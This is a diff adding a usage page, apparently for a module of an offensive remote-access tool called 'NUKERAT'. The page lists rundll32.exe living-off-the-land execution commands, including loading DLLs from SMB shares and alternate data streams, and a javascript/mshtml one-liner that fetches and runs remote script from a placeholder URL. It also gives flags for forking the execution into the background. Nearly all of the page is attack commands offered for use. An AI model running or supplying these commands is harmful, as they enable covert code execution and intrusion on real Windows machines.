@@ -1,0 +1,24 @@
+ABOUT
+    Windows utility to execute dll files. LOLBAS covers execute DLL
+    file, execute DLL from SMB share, and related techniques.
+
+USAGE:
+    rundll32.exe {PATH},EntryPoint
+    rundll32.exe {PATH_SMB:.dll},EntryPoint
+    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
+    rundll32 "{PATH}:ADSDLL.dll",DllMain
+    rundll32.exe -sta {CLSID}
+
+EXAMPLES:
+    rundll32.exe {PATH},EntryPoint
+    rundll32.exe {PATH_SMB:.dll},EntryPoint
+    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
+    rundll32 "{PATH}:ADSDLL.dll",DllMain
+    rundll32.exe -sta {CLSID}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    rundll32.exe {PATH},EntryPoint
